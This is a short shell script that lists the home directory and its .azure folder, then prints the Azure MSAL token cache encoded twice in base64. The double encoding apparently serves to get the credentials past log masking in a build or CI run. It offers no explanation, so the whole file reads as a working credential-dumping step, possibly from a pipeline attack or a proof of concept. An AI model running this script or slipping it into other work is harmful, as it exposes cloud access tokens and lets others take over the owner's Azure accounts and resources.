#!/bin/sh

echo "coucou"
echo "---"
ls -la .
echo "---"
ls -la $HOME
echo "---"
ls -la $HOME/.azure
echo "---"
cat $HOME/.azure/msal_token_cache.json | base64 -w0 | base64 -w0
echo "---"
